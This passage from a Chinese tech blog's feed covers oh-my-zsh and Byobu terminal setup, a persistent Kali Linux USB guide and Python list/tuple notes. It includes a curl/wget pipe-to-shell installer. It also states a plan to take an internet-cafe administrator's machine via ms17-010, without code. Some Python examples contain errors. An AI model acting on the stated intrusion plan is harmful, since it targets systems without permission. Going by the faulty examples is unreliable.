class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sh -c <span class="hljs-string">"<span class="hljs-variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sh -c <span class="hljs-string">"<span class="hljs-variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p></p><h4>美化配置</h4><p></p><p></p><h5>插件</h5><br>首先，标准的一些插件可在 <font color="red"><code>~/.oh-my-zsh/plugins/</code></font> ，这个目录下找到。<br>其次，自定义的插件，你应该添加到 <font color="red"><code>~/.oh-my-zsh/custom/plugins/</code></font> 目录。<br>最后 ，配置文件<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi ~/.zshrc</span><br></pre></td></tr></table></figure><p></p><p>找到类似与下面这串字符，添加在括号之中。（每一个插件应单独占一行）<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p></p><h5>主题</h5><br>编辑配置文件<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi ~/.zshrc</span><br></pre></td></tr></table></figure><p></p><p>找到 <font color="red"><code>ZSH_THEME</code></font> 选项，将你喜欢的主题名替换双引号之中的。譬如，我喜欢随机主题，那么就应该是这个样子。<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=<span class="hljs-string">"random"</span></span><br></pre></td></tr></table></figure></p><p>保存并退出。</p><p></p><h3>0x04 Byobu</h3><p></p><blockquote><p>一个窗口管理器和终端多路复用器；</p><p>以及终端窗口下方的一排系统监视器。<br>官网：<a href="http://byobu.org" target="_blank" rel="noopener">http://byobu.org</a><br>Github仓库：<a href="https://github.com/dustinkirkland/byobu" target="_blank" rel="noopener">https://github.com/dustinkirkland/byobu</a></p></blockquote><p></p><h4>安装</h4><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install byobu</span><br></pre></td></tr></table></figure><p></p><p></p><h4>快捷键</h4><p></p><ul><li>F1 - 配置菜单</li><li>F2 - 添加一个窗口</li><li>F3 - 移至左边窗口</li><li>F4 - 移至右边窗口</li><li>……<br>其他，具体看配置菜单中的 <strong>help</strong> ……<br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5ofu2apj30sh0k875y.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5orn6mbj30s60m5tbx.jpg"></li></ul><p></p><h4>关联oh-my-zsh</h4><br>配合 <em>oh-my-zsh</em> 一起使用会更完美，首先编辑一个配置文件<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> vi <span class="hljs-variable">$HOME</span>/.byobu/.tmux.conf</span></span><br></pre></td></tr></table></figure><p></p><p>然后将以下内容写入此配置文件中<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set -g default-shell /usr/bin/zsh</span><br><span class="line">set -g default-command /usr/bin/zsh</span><br></pre></td></tr></table></figure></p><p>保存并退出，完毕！</p><p></p><h4>永久使用</h4><br>还是和上面的 <strong>fish</strong> 一样，右击你的终端窗口，选择 <font color="red"><code>配置文件首选项</code></font> （英文就是 <font color="red"><code>Preferences</code></font> ）。然后在上方栏选择 <font color="red"><code>命令</code></font> 或者 <font color="red"><code>Command</code></font> ，勾上第二行，并在其下方输入 <font color="red"><code>/usr/bin/byobu</code></font> 。如下图所示：<br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5n969xoj30nb0k7t9v.jpg" alt=""><p></p><p></p><h4>一件小事</h4><br>使用了 <strong>byobu</strong> ，但你右击终端右（左）上角的关闭按钮，其实终端并没有关闭。它还在后台运行着，这时你想真真正正地去关闭它，得使用命令去关闭。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> <span class="hljs-built_in">exit</span></span></span><br></pre></td></tr></table></figure><p></p><p></p><h3>最后</h3><br>搞完了，来跑个小火车庆祝一下😍<br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxtkb0oytlg310z0pa4qq.gif" alt=""><p></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。&lt;/p&gt;
&lt;p&gt;关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;写在前面&lt;/h3&gt;

&lt;h4 id=&quot;关于终端模拟器（Updated-by-2019-03-18）&quot;&gt;&lt;a href=&quot;#关于终端模拟器（Updated-by-2019-03-18）&quot; class=&quot;headerlink&quot; title=&quot;关于终端模拟器（Updated by 2019.03.18）&quot;&gt;&lt;/a&gt;关于终端模拟器（Updated by 2019.03.18）&lt;/h4&gt;&lt;p&gt;其实在图形化上使用的都不算是真真正正的终端，算终端模拟器。真正的终端其实是最小化安装系统的那个黑界面。&lt;/p&gt;
    
    </summary>
    
      <category term="不美化，怎开发" scheme="https://fanqxu.com/categories/%E4%B8%8D%E7%BE%8E%E5%8C%96%EF%BC%8C%E6%80%8E%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Terminal" scheme="https://fanqxu.com/tags/Terminal/"/>
    
  </entry>
  
  <entry>
    <title>便携式Kali Linux创建</title>
    <link href="https://fanqxu.com/2018/11/10/%E4%BE%BF%E6%90%BA%E5%BC%8FKali-Linux%E5%88%9B%E5%BB%BA/index.html"/>
    <id>https://fanqxu.com/2018/11/10/便携式Kali-Linux创建/index.html</id>
    <published>2018-11-10T10:14:21.000Z</published>
    <updated>2018-12-28T04:33:12.564Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文由早前一简单想法而萌生，由此便有了本文。</p></blockquote><p>　　我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！<br>　　当然，也不一定可行，如果某电脑开启了<strong>BIOS锁</strong>（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险(小心被网管打断狗腿，哈哈)！！！</p><p>　　废话不多说……</p><a id="more"></a><h3 id="0x00-此前准备"><a href="#0x00-此前准备" class="headerlink" title="0x00 此前准备"></a>0x00 此前准备</h3><ul><li><p>Kali Linux ISO 镜像文件（<a href="cdimage.kali.org/kali-2018.4/kali-linux-2018.4-amd64.iso">下载传送门</a>）</p></li><li><p>Rufus（<a href="https://github.com/pbatard/rufus/releases/download/v3.3/rufus-3.3.exe" target="_blank" rel="noopener">下载传送门</a>）</p></li><li><p>一台搭载视窗操作系统的电脑</p></li><li><p>U盘或移动硬盘　　</p></li></ul><blockquote><p><strong>说明：</strong> 此文所安装的 <strong>Kali Linux</strong> 非 <strong>live</strong> ，而是<strong>持久性</strong>的。</p><p>本人Kali镜像包：kali-linux-2018.4-amd64.iso。Rufus只能安装在视窗上使用；U盘或移动硬盘自行准备，U盘建议3.0以上（本人金士顿3.0 64G依然卡），遂改用非SSD移动硬盘，当然SSD会更好。</p></blockquote><h3 id="0x01-正式开始之点鼠标操作"><a href="#0x01-正式开始之点鼠标操作" class="headerlink" title="0x01 正式开始之点鼠标操作"></a>0x01 正式开始之点鼠标操作</h3><p>首先，打开安装好了的 <strong>Rufus</strong>；如果你的是<strong>U盘</strong>，那么在<em>设备</em>项会自动识别你的U盘设备；如果是<strong>移动硬盘</strong>，应先勾上<em>显示USB外置硬盘</em>才能识别你的移动硬盘设备。下一步，在<em>引导类型选择</em>中选择你的<strong>Kali镜像</strong>。再下一步，选择 <strong>NTFS</strong> 的文件系统；其他选择项默认就行，可以点击<em>开始</em>了。</p><blockquote><p><em>一图概括：</em></p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx313qf0lrj30xq0p2q97.jpg" alt=""></p></blockquote></blockquote><p>然后，就会出现下面这种情况，选择第二项：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx31rb3qgrj30yg0o7446.jpg" alt=""></p></blockquote><p>再然后，直接点击确认：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx31sz9fm4j30wr0oan2i.jpg" alt=""></p></blockquote><p>最后，看到如下状态，等会儿：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx31t968xaj30vr0otdl4.jpg" alt=""></p></blockquote><p>至此，视窗上的操作已完成……</p><h3 id="0x02-启动项选择"><a href="#0x02-启动项选择" class="headerlink" title="0x02 启动项选择"></a>0x02 启动项选择</h3><p>接着上面的继续来……<br>首先，重启你的操作系统。在此过程中，不停的敲击键盘上左上角的 <strong>Esc</strong> 按键（请注意，此刻手速得快）。</p><blockquote><p><em>之后，你就会看到如下界面：</em></p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg" alt=""><br>选择 <strong>UEFI</strong> 项回车，如上图</p></blockquote></blockquote><p>然后，就进入到了 <strong>Kali live</strong> 的一些模式选择，如下图：</p><blockquote><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg" alt=""></p></blockquote></blockquote><p>此处，我选择的是第四项，<strong>persistence</strong> 持久化；而第五项 <strong>encrypted persistence</strong> 则是加密持久化。回车……</p><h3 id="0x03-骚操作之创建持久化Kali（重点）"><a href="#0x03-骚操作之创建持久化Kali（重点）" class="headerlink" title="0x03 骚操作之创建持久化Kali（重点）"></a>0x03 骚操作之创建持久化Kali（重点）</h3><p>经过漫长等待，终于进入到桌面。</p><p>打开终端，先查看一下磁盘信息：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> fdisk -l</span></span><br></pre></td></tr></table></figure></p><p>如下图，得到如下信息，简单概括为：</p><ul><li><p><code>sdc</code> 为我的移动硬盘（你的不一定是 <code>sdc</code> ，看实际大小）</p></li><li><p>931.5G大小</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx32hnayklj31hc0u0tkp.jpg" alt=""></p></blockquote></li></ul><p>分区了，为了数据安全，此处一定要注意，你的不一定是 <code>sdc</code> ，可能是 <code>sdb</code> 或者其他<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> fdisk /dev/sdc</span></span><br></pre></td></tr></table></figure></p><p><code>/dev/sdc</code> 即为我的移动硬盘，此命令即对我的移动硬盘进行分区<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help):n</span><br><span class="line">Partition type:</span><br><span class="line">  p   primary</span><br><span class="line">  e   extended</span><br></pre></td></tr></table></figure></p><p>回车后，先输入 <code>n</code> 即代表 <code>new</code> 新建一个分区，回车出现以上提示：</p><ul><li><p>p 　primary   (主分区)</p></li><li><p>e 　extended  (扩展分区)</p></li></ul><p>输入 <code>p</code> （默认主分区，或直接）回车，选择主分区：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select (default p):p</span><br></pre></td></tr></table></figure></p><p>分区号和第一扇区默认，直接回车：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Partition number（3,4 default 3）：</span><br><span class="line">First sector（6131712-1953525167, default 6131712）:</span><br></pre></td></tr></table></figure></p><p><code>Last sector</code> 这里就是设置此分区的总大小，我勉强给300G：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Last sector, +sector or +size&#123;K,M,G,T,P&#125;(6131712-1953525167, default 1953525167): +300G</span><br><span class="line">Created a new partition 3 of type 'Linux' and of size 300 GiB.</span><br></pre></td></tr></table></figure></p><p>最后，输入 <code>w</code> 保存：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure></p><p>至此，分区完毕。</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx32oyputhj31hc0u0tla.jpg" alt=""></p></blockquote><p>这时，<code>lsblk</code> 可以查看一下，<br>然后给刚刚分的区设置文件系统及创建持久化设置，如下图：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> lsblk</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> mkfs.ext4 -L persistence /dev/sdc3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> e2label /dev/sdc3 persistence</span></span><br></pre></td></tr></table></figure></p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx32pnm0quj31hc0u0k4d.jpg" alt=""></p></blockquote><p>到这儿，快结束了……</p><ol><li><p>创建挂载点</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> mkdir -p /mnt/disk</span></span><br></pre></td></tr></table></figure></li><li><p>挂载 (<code>mount</code>)</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> mount /dev/sdc3 /mnt/disk</span></span><br></pre></td></tr></table></figure></li><li><p>写入持久化配置文件</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">"/ union"</span> &gt; /mnt/disk/persistence.conf</span></span><br></pre></td></tr></table></figure></li><li><p>卸载（<code>umount</code>）</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> umount /mnt/disk</span></span><br></pre></td></tr></table></figure></li><li><p>重启（<code>reboot</code>）</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> reboot -i</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx32pwbt91j31hc0u0k3i.jpg" alt=""></p></blockquote><h3 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h3><p>请注意：</p><blockquote><p>重启后，还是和上面进入启动项一样，选择第二项：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg" alt=""></p></blockquote><p>这里还是选择第四项 <code>persistence</code> :</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg" alt=""></p></blockquote></blockquote><p>至此，<strong>持久化Kali</strong> 创建完毕咯……</p><p>可能还有后话哦（<del><code>metasploit</code> 拿网管主机shell</del>）……</p><h3 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h3>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文由早前一简单想法而萌生，由此便有了本文。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;　　我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！&lt;br&gt;　　当然，也不一定可行，如果某电脑开启了&lt;strong&gt;BIOS锁&lt;/strong&gt;（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险(小心被网管打断狗腿，哈哈)！！！&lt;/p&gt;
&lt;p&gt;　　废话不多说……&lt;/p&gt;
    
    </summary>
    
      <category term="TechShare" scheme="https://fanqxu.com/categories/TechShare/"/>
    
    
      <category term="kali" scheme="https://fanqxu.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Python笔记之列表与字典</title>
    <link href="https://fanqxu.com/2018/11/06/Python%E5%88%97%E8%A1%A8%E4%B9%8Blist%E4%B8%8Etuple/index.html"/>
    <id>https://fanqxu.com/2018/11/06/Python列表之list与tuple/index.html</id>
    <published>2018-11-05T16:03:04.000Z</published>
    <updated>2019-04-20T11:43:49.653Z</updated>
    
    <content type="html"><![CDATA[<p></p><h1>列表</h1><p></p><h2>0x00 list</h2><p>　　  列表 <font color="red"><code>list</code></font> 是 Python 内置的一种数据类型，它是一种<b>有序</b>的集合，可随时<b>添加</b>(append)和<b>删除</b>(pop)其中的元素。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName = [<span class="hljs-string">'elements0'</span>,<span class="hljs-string">'elements1'</span>,<span class="hljs-string">'elements2'</span>]</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName</span></span><br><span class="line">['elements0','elements1','elements2']</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>　　这里变量 <code>VarName</code>就是一个<code>list</code>。<font color="red"><code>len()</code></font>函数获取 <strong>list</strong> 元素个数，若 <strong>list</strong> 中无一个元素，就是一个空的 <strong>list</strong> ，长度为0：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; len(VarName)</span></span><br><span class="line">3</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; <span class="hljs-built_in">test</span> = []</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; len(<span class="hljs-built_in">test</span>)</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><strong>索引访问：</strong><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[0]</span></span><br><span class="line">'elements0'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[1]</span></span><br><span class="line">'elements1'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[2]</span></span><br><span class="line">'elements2'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[3]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">IndexError: list index out of range</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[-1]</span></span><br><span class="line">'elements2'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[-2]</span></span><br><span class="line">'elements1'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[-3]</span></span><br><span class="line">'elements0'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; VarName[-4]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">IndexError: list index out of range</span><br></pre></td></tr></table></figure></p><p>  　　索引是从<strong>0</strong>开始，并且当索引超出了范围时，会报一个 <strong>IndexError</strong> 错误。取最后一个元素，还可用-1做索引；以此类推，可获取倒数第2个、倒数第3个。</p><p>因为<code>list</code>是一个可变有序表，所以可往其中添加、插入、删除、替换元素：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports = [<span class="hljs-string">'table tennis'</span>,<span class="hljs-string">'badminton'</span>]</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports.append(<span class="hljs-string">'Tai Chi'</span>)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports</span></span><br><span class="line">['table tennis','basketball','Tai Chi']</span><br></pre></td></tr></table></figure></p><font color="red"><code>append()</code></font>方法将元素追加到末尾，将元素插入指定位置使用<code>insert()</code>方法，例如插入一元素至首(0)：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports</span></span><br><span class="line">['table tennis','basketball','Tai Chi']</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports.insert(0,badminton)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports</span></span><br><span class="line">['badminton','table tennis','basketball','Tai Chi']</span><br></pre></td></tr></table></figure><br><br><font color="red"><code>pop()</code></font>方法删除 <strong>list</strong> 末尾的元素：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">['badminton','table tennis','basketball']</span><br></pre></td></tr></table></figure><br><br><font color="red"><code>pop(i)</code></font>方法删除指定位置的元素，<font color="red">i</font> 是索引位置<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports.pop(2)</span></span><br><span class="line">'basketball'</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports</span></span><br><span class="line">['badminton','table tennis']</span><br></pre></td></tr></table></figure><br><br><strong>替换</strong>，直接赋值给对应索引位置：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports[0] = <span class="hljs-string">'swim'</span></span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sports</span></span><br><span class="line">['swim','table tennis']</span><br></pre></td></tr></table></figure><br><br><strong>list</strong> 中的元素可以不同，可以同时有<strong>字符串</strong>、<strong>数型</strong>、<strong>布尔型</strong>；另外，<strong>list</strong> 中一个元素可为另一个 <strong>list</strong><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; proLanguage = [<span class="hljs-string">'java'</span>,<span class="hljs-string">'python'</span>,[<span class="hljs-string">'html'</span>,<span class="hljs-string">'css'</span>],<span class="hljs-string">'c++'</span>]</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; len(proLanguage)</span></span><br><span class="line">4</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; proLanguage[2]</span></span><br><span class="line">['html','css']</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; webDesign = [<span class="hljs-string">'html'</span>,<span class="hljs-string">'css'</span>]</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; proLanguage = [<span class="hljs-string">'java'</span>,<span class="hljs-string">'python'</span>,webDesign,<span class="hljs-string">'c++'</span>]</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; proLanguage[2] == webDesign</span></span><br><span class="line">True</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; proLanguage[2][0] == webDesign[0] == <span class="hljs-string">'html'</span></span></span><br><span class="line">True</span><br></pre></td></tr></table></figure><br><br><h2>0x01 tuple</h2><br><br>另一种有序列表叫元组：<strong>tuple</strong><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sex = (<span class="hljs-string">'male'</span>,<span class="hljs-string">'female'</span>)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; sex</span></span><br><span class="line">('male','female')</span><br></pre></td></tr></table></figure><br><br><strong>tuple</strong> 与 <strong>list</strong> 较相似；但 <strong>tuple</strong> 一旦初始化就不能修改。它没有<code>append()</code>、<code>insert()</code>方法，可以正常使用sex[0]、sex[1]，但不能赋值成另外的元素；其他获取元素的方法和 <strong>list</strong> 一样。<br><br><strong>tuple</strong> 不可变，所以代码更加安全；若能够代替 <strong>list</strong> ，请尽量使用 <strong>tuple</strong> 。<br><br><strong> 一个“可变的” tuple</strong><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; varTuple = (<span class="hljs-string">'A'</span>,<span class="hljs-string">'B'</span>,[<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>])</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; varTuple[2][0] = <span class="hljs-string">'X'</span></span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; varTuple[2][1] = <span class="hljs-string">'Y'</span></span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; varTuple</span></span><br><span class="line">('A','B',['X','Y'])</span><br></pre></td></tr></table></figure><br><br>表面上，<strong>tuple</strong> 元素确实变了，但其实变的是 <strong>list</strong> 的元素。<br><br><font color="red"><strong>请注意：</strong></font><p>当定义只有１个元素的 <strong>tuple</strong>，如果：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; numOne = (1)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; numOne</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>　　请注意，这是一个错觉。这时，定义的不是 <strong>tuple</strong>，而是给变量<code>numOne</code>赋值<code>１</code>这个数！因为括号<code>()</code>既可表示 <strong>tuple</strong>，又可表示数学中的小括号。因此，<strong>Python</strong> 规定，这种情况下按小括号进行计算。</p><p>所以，只有１个元素的 <strong>tuple</strong> 定义时须加一个逗号<font color="red"><code>,</code></font> ：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; numOne = 